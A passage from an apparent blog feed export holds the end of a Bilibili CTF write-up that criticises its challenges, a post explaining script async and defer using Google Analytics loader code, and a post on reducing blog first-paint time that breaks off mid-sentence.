<code>is_numeric</code>、<code>intval</code>，我找到了一篇写的还挺全面的文章「<a href=\"https://hackfun.org/2018/01/09/CTF%E4%B8%AD%E5%B8%B8%E8%A7%81PHP%E7%89%B9%E6%80%A7%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/\">CTF 中常见 PHP 特性学习笔记</a>」。</p>\n<blockquote><p>顺便，不少战队和选手通过 <code>$file_get_contents</code> 逃逸后，把每道题的源码都读了一遍、甚至通过读取 <code>/dev/urandom</code> 和 <code>/dev/random</code> 拖死了靶机，不过这已经是后话了。</p></blockquote>\n<h2>尾声</h2>\n<p>USTC Hackergame 2018 为了「黑曜石浏览器」的题专门上线了一个官网、在那个官网的源码中隐藏了 Heicore Browser 的 User-Agent，Bilibili 的第二题是一个非常拙劣的模仿；第三题直接就是脑筋急转弯，和渗透、社工毫无关联，密码纯粹靠猜；第四题更是表现了出题人的前端知识基本为 0，使用从 CSDN 上抄来的 URL 参数解析代码，却不知道 JavaScript 中 <code>unescape</code> 不能处理非 ASCII 字符（更不必说 <code>unescape</code> 是一个已被弃用的方法），基本上是个前端都知道宁肯引入 <code>URL.searchParams</code> 的 Polyfill 也不应该自己解析 URL；第五题并没有明确提示告诉大家应该从给定的默认 uid 开始刷（你给我翻译翻译，谁家系统的超级管理员 uid 不是小于 10 而是大于 1 亿的？）。在经过了这么多无厘头的题目以后，接下来上来就是五道 Web 盲题：未设防 Redis 题本来可以深入到 Get shell、提权的，结果第八题草草 <code>get flag8</code> 了事；第十题的「文件路径猜解」更是非常无厘头，当做题人构建完能绕过 <code>is_numeric</code> 和 <code>intval</code>  的 Payload 后，还要猜测 <code>url</code> 参数的取值需要包含 <code>flag.txt</code> 才能取到最终的 flag；而且第十题拿到的图片直接 <code>tail</code> 就能拿到 flag，而图片隐写本来是非常经典的 CTF 考法。</p>\n<p>无厘头的题目、加上混乱的活动页面（Vue 和 jQuery 齐飞、Element UI 共 Bootstrap 一色），再联想起 Bilibili 中间件源码泄漏、Anankke 在新年活动上 <a href=\"https://blog.anank.ke/w/pilipili_cheers\">只用两小时就刷出了 11 亿美食值</a>，我们大体上可以猜测的出 Bilibili 内部混乱的管理、松散的组织，和极度不重视信息安全、乃至极度不重视技术的风气。Bilibili 这一次的 CTF 暴露出来的问题，远不止选手用 <code>/blog/end.php</code> 读取 <code>/dev/urandom</code> 和 <code>/dev/random</code> 耗尽靶机性能导致题目 404 这么简单了。</p>\n<div class=\"license\"> <div class=\"license-title\">Bilibili 2020「1024 程序员节」CTF Write Up</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/\">https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-10-25</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/"},{"title":"从 Google Analytics 的统计代码说起 —— 谈谈 script 标签的 async 和 defer 属性","date":"2020-10-13 09:25:00","description":"\n<p>之前我在「<a href=\"https://blog.skk.moe/post/how-to-make-a-fast-blog/\">天下武功，唯快不破 —— 我是这样优化博客的</a>」一文中提到「对于大部分浏览器来说，确保 JS 异步加载和执行的做法其实是在操作 DOM 动态插入 <code>&lt;script async&gt;</code>」，但是并没有给出详细原因。这一次我以 Google Analytics 的统计代码为引子，详细讲讲 <code>&lt;script&gt;</code> 的 <code>async</code> 和 <code>defer</code> 属性、以及它们背后的故事。</p>\n<h2>拆开 Google Analytic 的统计代码</h2>\n<p>现在 Google 推出了 Google Tag Manager，通过 <code>window.gtag</code> 可以轻易加载包括 <code>analytics.js</code>、Google AD、Google OAuth 等 Google 插件：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-comment\">&lt;!-- Global site tag (gtag.js) - Google Analytics --&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">async</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">\"https://www.googletagmanager.com/gtag/js?id=UA-122669675-1\"</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\">  <span class=\"hljs-built_in\">window</span>.dataLayer = <span class=\"hljs-built_in\">window</span>.dataLayer || [];</span><span class=\"javascript\">  <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">gtag</span>(<span class=\"hljs-params\"></span>)</span>{dataLayer.push(<span class=\"hljs-built_in\">arguments</span>);}</span><span class=\"javascript\">  gtag(<span class=\"hljs-string\">'js'</span>, <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>());</span><span class=\"javascript\"></span><span class=\"javascript\">  gtag(<span class=\"hljs-string\">'config'</span>, <span class=\"hljs-string\">'UA-XXXXX-Y'</span>);</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span></code></pre>\n<p>在 Google Tag Manager 出现之前，大部分人更熟悉传统的 <code>analytics.js</code> 统计代码：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-comment\">&lt;!-- Google Analytics --&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\">(<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">i,s,o,g,r,a,m</span>)</span>{i[<span class=\"hljs-string\">'GoogleAnalyticsObject'</span>]=r;i[r]=i[r]||<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)</span>{</span><span class=\"javascript\">(i[r].q=i[r].q||[]).push(<span class=\"hljs-built_in\">arguments</span>)},i[r].l=<span class=\"hljs-number\">1</span>*<span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>();a=s.createElement(o),</span><span class=\"javascript\">m=s.getElementsByTagName(o)[<span class=\"hljs-number\">0</span>];a.async=<span class=\"hljs-number\">1</span>;a.src=g;m.parentNode.insertBefore(a,m)</span><span class=\"javascript\">})(<span class=\"hljs-built_in\">window</span>,<span class=\"hljs-built_in\">document</span>,<span class=\"hljs-string\">'script'</span>,<span class=\"hljs-string\">'https://www.google-analytics.com/analytics.js'</span>,<span class=\"hljs-string\">'ga'</span>);</span><span class=\"javascript\"></span><span class=\"javascript\">ga(<span class=\"hljs-string\">'create'</span>, <span class=\"hljs-string\">'UA-XXXXX-Y'</span>, <span class=\"hljs-string\">'auto'</span>);</span><span class=\"javascript\">ga(<span class=\"hljs-string\">'send'</span>, <span class=\"hljs-string\">'pageview'</span>);</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-comment\">&lt;!-- End Google Analytics --&gt;</span></code></pre>\n<p>Google 提供的代码是经过压缩后的版本。不过这段代码很短，完全不使用 debugger 等方法也可以还原出原始的代码，让我们拆拆看吧。</p>\n<p>首先不难看出这是一个 IIFE 函数，变量 <code>i</code>、<code>s</code>、<code>o</code>、<code>g</code> 和 <code>r</code>分别指的是 <code>window</code>、<code>document</code>、<code>'script'</code>、<code>https://www.google-analytics.com/analytics.js</code> 和 <code>'ga'</code>（变量 <code>a</code> 和 <code>m</code> 尚未被赋值）。让我们替换这些变量、把 IIFE 拆开：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'GoogleAnalyticsObject'</span>] = <span class=\"hljs-string\">'ga'</span>;<span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>] = <span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>] || <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\"></span>) </span>{  <span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>].q = (<span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>].q || []).push(<span class=\"hljs-built_in\">arguments</span>)};<span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>].l = +<span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>();<span class=\"hljs-keyword\">var</span> a = <span class=\"hljs-built_in\">document</span>.createElement(<span class=\"hljs-string\">'script'</span>);a.async = <span class=\"hljs-number\">1</span>;a.src = <span class=\"hljs-string\">'https://www.google-analytics.com/analytics.js'</span>;<span class=\"hljs-keyword\">var</span> m = <span class=\"hljs-built_in\">document</span>.getElementsByTagName(<span class=\"hljs-string\">'script'</span>)[<span class=\"hljs-number\">0</span>];m.parentNode.insertBefore(a, m);</code></pre>\n<p>这下就清楚多了。抛开 Google Analytics 的队列初始化、函数初始化的操作，<code>analytics.js</code> 本质上是通过 JS 动态创建一个 <code>&lt;script async&gt;</code> 标签、并插入到 DOM 中所有 <code>&lt;script&gt;</code> 标签之前。</p>\n<p><a href=\"https://developers.google.com/analytics/devguides/collection/analyticsjs/\">Google 关于 <code>analytics.js</code> 的文档</a> 是这么介绍的：</p>\n<blockquote>\n<p>While the Google Analytics tag described above ensures the script will be loaded and executed asynchronously on all browsers, it has the disadvantage of not allowing modern browsers to preload the script.</p>\n<p>虽然上述代码保证了脚本在所有浏览器上都会异步地加载和执行，但是它也有一个缺陷、它不能够让浏览器 preload 外部的脚本文件。</p>\n</blockquote>\n<p>Google 在文档中也给出了「现代浏览器」专用的代码，看起来和今天的 Google Tag Manager 载入代码非常接近：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-comment\">&lt;!-- Google Analytics --&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\"><span class=\"hljs-built_in\">window</span>.ga=<span class=\"hljs-built_in\">window</span>.ga||<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)</span>{(ga.q=ga.q||[]).push(<span class=\"hljs-built_in\">arguments</span>)};ga.l=+<span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>;</span><span class=\"javascript\">ga(<span class=\"hljs-string\">'create'</span>, <span class=\"hljs-string\">'UA-XXXXX-Y'</span>, <span class=\"hljs-string\">'auto'</span>);</span><span class=\"javascript\">ga(<span class=\"hljs-string\">'send'</span>, <span class=\"hljs-string\">'pageview'</span>);</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">async</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">'https://www.google-analytics.com/analytics.js'</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-comment\">&lt;!-- End Google Analytics --&gt;</span></code></pre>\n<p>Google 文档也对第二种代码进行了介绍：</p>\n<blockquote>\n<p>The alternative async tag below adds support for preloading, which will provide a small performance boost on modern browsers, but can degrade to synchronous loading and execution on IE 9 and older mobile browsers that do not recognize the <code>async</code> script attribute.</p>\n<p>第二种方法在现代浏览器上会略微提升性能，因为现代浏览器支持 preloading。但是在不认识 <code>async</code> 属性的 IE9 和一些老旧的移动端浏览器上，这种方法会降级为同步加载和执行。</p>\n</blockquote>\n<p>所以，结合上述代码和 Google 文档中的描述，我们不难得出结论：</p>\n<ul>\n<li>第一种做法（由 JS 生成 <code>&lt;script async&gt;</code> 标签、动态插入 DOM 中）可以确保 <code>analytics.js</code> 被异步加载和执行，但是在现代浏览器上由于不能提前发现 <code>analytics.js</code> 、不能 preload。</li>\n<li>第二种做法在 HTML 中直接声明了 <code>&lt;script async&gt;</code>、可以被现代浏览器在 Parse HTML 阶段发现 <code>analytics.js</code> 并 preload。但是对于「并不现代的」浏览器中，这种做法不能保证 <code>analytics.js</code> 被异步加载和执行。</li>\n</ul>\n<p>那么，为什么 Google 要这么说呢？</p>\n<h2>混乱的 defer 和 async 实现</h2>\n<p>绝大部分从事前端开发的程序员应该都非常了解 <code>defer</code> 和 <code>async</code> 以及他们的区别：</p>\n<ul>\n<li>\n<code>async</code> 的加载不会阻碍 DOM 的解析，但是当加载完后就会立即执行，执行时会阻碍 DOM 的解析</li>\n<li>\n<code>defer</code> 的加载也不会阻碍 DOM 的解析，并且会在 DOM 解析完后、<code>DOMContentLoaded</code> 触发之前执行</li>\n</ul>\n<p>鲜少有人知道的是，在 HTML5 之前，异步加载和执行外部脚本有一段混乱而荒唐的历史。</p>\n<p><code>defer</code> 属性的历史可以追溯到 1999 年 12 月 24 日制定的 HTML4.01 规范。在 <a href=\"https://www.w3.org/TR/html401/interact/scripts.html#adef-defer\">规范的第 18.2 节中的 18.2.1「SCRIPT 元素」</a> 中，有对 <code>defer</code> 属性的描述：</p>\n<blockquote>\n<p>When set, this boolean attribute provides a hint to the user agent that the script is not going to generate any document content (e.g., no “document.write” in javascript) and thus, the user agent can continue parsing and rendering.</p>\n<p>该 Boolean Attribute 用于提示 User Agent 这份脚本不会生成 document 内容（如，不使用 <code>document.write</code>），因此 User Agent 在遇到该脚本时不应该暂停解析和渲染 document。</p>\n</blockquote>\n<p>值得注意的是，在 HTML4.01 规范中没有强制浏览器用什么行为面对 <code>defer</code> 属性，各个浏览器的实现导致了千奇百怪的行为，这里仅简单列举几个 Quirk 行为：</p>\n<ul>\n<li>2001 年发布的 IE 6 开始对 <code>defer</code> 属性提供支持，但是直到 11 年后 IE 10 发布之前，IE 都不能保证带有 <code>defer</code> 属性的 <code>&lt;script&gt;</code> 能够按顺序执行：如果第一个 <code>defer</code> 的 <code>&lt;script&gt;</code> 使用 DOM API 修改了 DOM 结构、那么第二个 <code>&lt;script defer&gt;</code> 会在第一个 <code>&lt;script&gt;</code> 执行完毕之前就会开始执行。</li>\n<li>2009 年发布的 Firefox 3.5 开始对 <code>defer</code> 属性提供支持，<a href=\"https://bugzilla.mozilla.org/show_bug.cgi?id=688580\">但是带有 <code>defer</code> 的 <code>&lt;script&gt;</code> 可能会在 <code>DOMContentLoaded</code> 之后加载和执行</a>，而且 Firefox 甚至会异步执行带有 <code>defer</code> 属性的内联脚本。这一行为直到五年后在 Firefox 31 中才被修复。</li>\n<li>2010 年的 Chrome 8 开始实现 <code>defer</code> 属性。但如果页面的 MIME Type 为 XHTML（<code>application/xhtml+xml</code>），那么 <a href=\"https://bugs.chromium.org/p/chromium/issues/detail?id=874749\">Chrome 会无视 <code>&lt;script&gt;</code> 的 <code>defer</code> 属性</a>，因为 <a href=\"https://bugs.chromium.org/p/chromium/issues/detail?id=611136\">在 XHTML 中 <code>defer</code> 属性只是一个可选实现</a>。</li>\n</ul>\n<p>终于在 HTML5 中，不仅 <code>defer</code> 应有的行为被正式确定下来，而且还介绍了一个新的属性 <code>async</code>，提供了「真正异步地」加载和执行外部脚本的方式。也正是因为 HTML5 正式发布，下面这张介绍 <code>defer</code> 和 <code>async</code> 区别的图也开始深入人心：</p>\n<blockquote><p>这张出现在绝大部分文章中的图，正是来自 HTML5 规范：<a href=\"https://html.spec.whatwg.org/multipage/scripting.html#attr-script-async\">https://html.spec.whatwg.org/multipage/scripting.html#attr-script-async</a></p></blockquote>\n<p>IE 10、Chrome 8、Firefox 3.6 都对 <code>async</code> 属性提供了支持。相对于 <code>defer</code> 混乱的实现，浏览器对 <code>async</code> 的实现可谓是乖巧了许多：除 Safari 5.0 会无视 <code>async</code> 的取值外（<code>async=false</code> 时仍然会异步地加载和执行该外部脚本。这一 Bug 在 Safari 5.1 即被修复），绝大部分浏览器的实现都很正常。</p>\n<h2>等等，动态插入的 script 标签呢</h2>\n<p>如果你还记得 Google 给出的第一种 <code>analytics.js</code> 的加载方法的话（什么？你不记得了？快回到第一节再看一遍），你会注意到 Google 为了「保证了脚本在所有浏览器上都会异步地加载和执行」，使用了 <code>document.createElement('script')</code> 和 <code>el.parentNode.insertBefore</code> 动态插入 <code>&lt;script&gt;</code> 标签。这就引出了这一节的内容：动态插入的 <code>&lt;script&gt;</code> 应该按照什么顺序加载和执行呢？</p>\n<p>这个问题在 HTML4.01 的规范中完全没有说明，因此 HTML5 发布之前，当时的浏览器也依然采用了自己的实现：</p>\n<ul>\n<li>对于 WebKit、Blink 和 IE，动态插入的脚本将会被默认视为需要被异步加载和执行的脚本。如果要同步执行，需要显式声明 <code>async = false</code>。</li>\n<li>对于 Presto（早期 Opera 使用的自研内核）和 Firefox &lt;= 4，动态插入的脚本会默认同步加载和执行，除非显示声明 <code>async = true</code>。不过从 Firefox 4.0 开始，动态插入的脚本将会异步加载和执行，以和 IE、WebKit 行为保持一致（因此同步执行也一样需要显式声明 <code>async = false</code> ）；当 Opera 15 开始更换为基于 Chormium 开发（当时 Chromium 版本为 28）后，行为也变得和 IE、WebKit 一致。</li>\n</ul>\n<p>在 HTML5 规范中，这一问题终于被一劳永逸的解决了。在「<a href=\"https://html.spec.whatwg.org/multipage/scripting.html#script-processing-model\">HTML Standard - 4.12.1.1 Processing Model</a>」中明确规定了浏览器应该如何处理动态插入的 <code>&lt;script&gt;</code>。对于传统的脚本（非 Module），大致处理流程如下所示：</p>\n<blockquote><p>本图由 Sukka 绘制，按照 CC BY-NC-SA 4.0 协议共享。使用时请遵守许可协议，注明出处、不得被用于商业用途（除非获得书面许可）。</p></blockquote>\n<h2>尾声</h2>\n<p>Google Analytics 在 2013 年开始逐渐用 <code>analytics.js</code> 代替 <code>ga.js</code> 时，市面上同时存在有现代的支持 HTML5 和 <code>async</code> 属性的浏览器、和不支持 <code>async</code> 属性的「前 HTML5 时代的」古董浏览器。如果要保证在所有的浏览器上 Google Analytics 都能被异步地加载和执行，动态地将 <code>&lt;script&gt;</code> 标签插入 DOM 中、并显式声明 <code>async = true</code> 无疑是唯一的方法。随着古董浏览器逐渐退出人们的视线、实现 <code>async</code> 属性的浏览器在全球的份额已经达到了 98.08%，Google 终于开始直接用 <code>&lt;script async&gt;</code> 标签引入 Google Tag Manager。</p>\n<div class=\"license\"> <div class=\"license-title\">从 Google Analytics 的统计代码说起 —— 谈谈 script 标签的 async 和 defer 属性</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/script-async-defer/\">https://blog.skk.moe/post/script-async-defer/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-10-13</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/script-async-defer/"},{"title":"再快一点，再快一点 —— 优化博客白屏时间的实践","date":"2020-10-03 08:40:00","description":"\n<p>两个多月以前，我写了一篇文章 <a href=\"https://blog.skk.moe/post/how-to-make-a-fast-blog/\">介绍我是如何优化我的博客的</a>，但是我对于博客的白屏时间仍然不满意。过去一个月我在博客上进行了一系列优化实践，终于成功将博客的白屏时间减少了将近 50%，这篇文章就来记录优化的过程和方案。</p>\n<h2>确定和分析白屏时间</h2>\n<p>First Paint 和 First Contentful Paint 是衡量白屏时间的重要指标。Google Chrome 团队提供了专门的库 <code>web-vitals</code> 用于在浏览器中衡量这些指标。直接在本地开发环境中引入该库：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">type</span>=<span class=\"hljs-string\">\"module\"</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\">  <span class=\"hljs-keyword\">import</span> {getFCP, getLCP, getFID} <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">'https://unpkg.com/web-vitals@0.2.4/dist/web-vitals.es5.min.js?module'</span>;</span><span class=\"javascript\">  <span class=\"hljs-comment\">// 获取 First Contentful Paint</span></span><span class=\"javascript\">  getFCP(<span class=\"hljs-function\">(<span class=\"hljs-params\">{ name, value }</span>) =&gt;</span> <span class=\"hljs-built_in\">console</span>.log(name, value));</span><span class=\"javascript\">  <span class=\"hljs-comment\">// 获取 Largest Contentful Paint</span></span><span class=\"javascript\">  getLCP(<span class=\"hljs-function\">(<span class=\"hljs-params\">{ name, value }</span>) =&gt;</span> <span class=\"hljs-built_in\">console</span>.log(name, value));</span><span class=\"javascript\">  <span class=\"hljs-comment\">// 获取 First Input Delay</span></span><span class=\"javascript\">  getFID(<span class=\"hljs-function\">(<span class=\"hljs-params\">{ name, value }</span>) =&gt;</span> <span class=\"hljs-built_in\">console</span>.log(name, value));</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span></code></pre>\n<p>访问在本地运行的 Hexo Server 实例（<code>http://localhost:4000</code>），打开任意一篇文章，然后在 Dev Tools 中切换到「Performance」Tab 中限制 Network 和 CPU 性能：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/1.png\" width=\"1276\" height=\"279\" class=\"lazy post-img\"></p>\n<blockquote><p>进行性能测试时，模拟移动端的网络和性能是非常重要的。然而，Firefox 的 Dev Tools 至今很遗憾地没有实现这个功能（许多类似的 Feature Request 在 Bugzilla 已经 stall 数个月了）。这也是为什么我钟情于使用 Chromium Based 的浏览器开发的原因。</p></blockquote>\n<p>刷新页面，Console 中会输出三个数值（单位均为毫秒）：</p>\n<pre><code class=\"hljs plaintext\">FCP 1537.4400000000605LCP 1921.934FID 3.559999997378327</code></pre>\n<p>可以看到，First Contentful Paint 时间在 1.5 秒左右、而 Largest Contentful Paint（最大的可视元素，此时是文章的头图）是 1.9 秒。考虑到这是在本地环境、TTFB 只受模拟的「Fast 3G」限制，不难想象在实际访客体验中白屏时间绝对不止 1.5 秒。</p>\n<h2>分析性能瓶颈</h2>\n<p>肯定了问题的确存在，接下来就需要寻找性能瓶颈了。在「Performance」Tab 中将 CPU 性能修改为「6x slowdown」放大性能瓶颈，然后用「Start profiling and reload page」按钮刷新页面和获取火焰图：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/2.png\" width=\"1386\" height=\"946\" class=\"lazy post-img\"></p>\n<p>其中，Layout 占据的时间（117.43ms）比 Parse HTML（22.48ms）和 Recalculate Style（20.37ms）都要长得多，基本可以认定这就是性能瓶颈了。接下来判断是页面什么元素导致了 Layout 的性能瓶颈。对博客中其它页面进行 Profiling，并将火焰图进行对比：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/3.png\" width=\"860\" height=\"450\" class=\"lazy post-img\"></p>\n<blockquote><p>从左往右分别是 「<a href=\"https://blog.skk.moe/post/make-oh-my-zsh-fly/\">我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化</a>」、首页、「<a href=\"https://blog.skk.moe/post/hello-world/\">Hello World</a>」页面的火焰图和 Layout 用时。</p></blockquote>\n<p>根据火焰图和三个页面的特征，猜测是文章内容部分导致了 Layout 用时过长。为了加以验证，在 CSS 中使用 <code>display: none</code> 将文章内容直接从 DOM 中离线，然后重新生成火焰图。</p>\n<blockquote><p>在页面渲染时， <code>display: none</code>  的元素会直接从 DOM 中离线、不参加 Style 和 Layout。</p></blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/4.png\" width=\"1194\" height=\"946\" class=\"lazy post-img\"></p>\n<p>将文章内容设置 <code>display: none</code> 后，Layout 性能直接提升了三倍，所以可以确认性能瓶颈就是文章内容的 Layout 了。</p>\n<h2>优化白屏时间</h2>\n<p>文章内容的 Layout 时间比较长，而文章内容在加载完之前不会触发 First Paint。所以如果需要缩短白屏时间，就必须缩短文章内容 Layout 的用时。</p>\n<p>Layout 是浏览器计算元素几何信息的过程：元素的大小、在页面中的位置。Layout 性能一般和 DOM 元素数量、布局复杂性、布局模型有关。对于 DOM 元素数量这一点没有什么好的解决方案 —— 文章就这么长、每个段落就是一个 <code>&lt;p&gt;</code> 元素；对于文章内容也没有布局复杂性或布局模型可言。因此这是一条死路。</p>\n<p>直接对着自己的博客动死脑筋是行不通的，我决定先和其他的内容网站的 Layout 性能对比一下：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/5.png\" width=\"960\" height=\"500\" class=\"lazy post-img\"></p>\n<blockquote><p>上图左一为知乎专栏文章「<a href=\"https://zhuanlan.zhihu.com/p/25800461\">PWA 在饿了么的实践经验</a>」的火焰图；左二为 QuQuBlog「<a href=\"https://imququ.com/post/optimize-tls-handshake.html\">TLS 握手优化详解</a>」的火焰图；左三为 dev.to 的「<a href=\"https://dev.to/mustapha/css-grid-illustrated-introduction-52l5\">CSS Grid: illustrated introduction</a>」的火焰图。</p></blockquote>\n<p>和其它内容网站比较发现，当页面包含较长篇幅的内容时，「CPU 6x slowdown」下 Layout 用时大抵在 100ms 到 200ms 左右。我的博客内容页面 Layout 用时在 120ms 属于正常范围、基本没有进一步优化的空间。</p>\n<p>不过，我在看 dev.to 的火焰图时发现了一个很有趣的现象：虽然完整 DOM 的 Layout 用时在 123.70ms、但是却发生在 First Paint 和 First Contentful Paint 之后。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/6.png\" width=\"1090\" height=\"314\" class=\"lazy post-img\"></p>\n<p>结合截图和火焰图可以发现，dev.to 在加载文章页面时，先只渲染 Navbar、触发 First Paint、结束白屏；之后继续 Parse HTML、渲染页面主体内容；最后是 Lazyload 后的文章头图、触发 Largest Contentful Paint。这种思路在 H5、小程序中都是很常见：使用 Placeholder （被称为 AppShell）缩短白屏时间、然后再通过 AJAX 获取数据填充到页面上。但是静态博客和小程序最大的区别就是不需要获取数据、文章内容是直接包含在 HTML 中返回的，所以在博客上实践这样的思路需要做一些改变。</p>\n<p>我的做法则是将 CSS 拆分，将 Navbar 和右下角 Fab 按钮的 CSS 提取出来、内联在 HTML 中、当页面加载时就可以 Style &amp; Layout。同时为页面主题内容添加 <code>display: none</code> 使其在 DOM 中离线，使其不影响 First Paint；页面主体内容的 CSS（包括  <code>display: block</code>） 拆分成独立的 CSS。由于 CSS 是「渲染阻塞（Render Blocking）」的资源，浏览器在 Parse HTML 时如果遇到 CSS 就会开始请求、并在 CSS 下载完成之前不会开始 Style &amp; Layout。因此，需要一个小 trick 实现异步加载 CSS（使 CSS 不再阻塞渲染）：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">link</span> <span class=\"hljs-attr\">rel</span>=<span class=\"hljs-string\">\"stylesheet\"</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\">\"defer.css\"</span> <span class=\"hljs-attr\">media</span>=<span class=\"hljs-string\">\"print\"</span> <span class=\"hljs-attr\">onload</span>=<span class=\"hljs-string\">\"this.media='all';this.onload=null\"</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">noscript</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">link</span> <span class=\"hljs-attr\">rel</span>=<span class=\"hljs-string\">\"stylesheet\"</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\">\"defer.css\"</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">noscript</span>&gt;</span></code></pre>\n<p>带有 <code>[media=print]</code> 属性的 CSS 仍然会以低优先级加载，但并不会直接参与 Style &amp; Layout、因此不会阻塞渲染。当 CSS 文件下载后触发 <code>onload</code> 事件、将 <code>media</code> 属性改为 <code>all</code>、使 CSS 在当前页面生效。</p>\n<p>为了使白屏不显得枯燥，我还加了一个「加载中」的闪烁动画，使用 <code>animation-delay</code> 延迟 0.6 秒显示。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/9.png\" width=\"813\" height=\"849\" class=\"lazy post-img\"></p>\n<p>不过使用这种方案需要注意两个问题。一是当页面内容被 <code>display: none</code> 后、页面的高度会小于 viewport、因此浏览器不会展示滚动条；当页面内容被覆盖为 <code>display: block</code> 后、浏览器会重新展示滚动条、导致抖动，因此需要为 <code>&lt;html&gt;</code> 添加 <code>overflow-y: scroll</code>。另一个问题是新的 CSS 生效时会触发新的 Style &amp; Layout、可能会导致已经渲染过的 Navbar 和 Fab 按钮被再次 Layout，造成性能浪费；解决方案是使用「<a href=\"https://drafts.csswg.org/css-contain/\">CSS Containment</a>」草案中引入的 <code>contain</code> 属性，通过在 CSS 中显式声明当前元素及其后代与 DOM 的关系，当浏览器重新计算样式和布局时只会影响有限的 DOM。截至本文写就，Edge（Chromium Based）、Firefox、Chrome 都已经对 <code>contain</code> 属性提供了支持。关于 CSS Containment 的用法，可以参考 <a href=\"https://developer.mozilla.org/en-US/docs/Web/CSS/contain\">MDN 上对 contain 的说明</a>。</p>\n<p><img 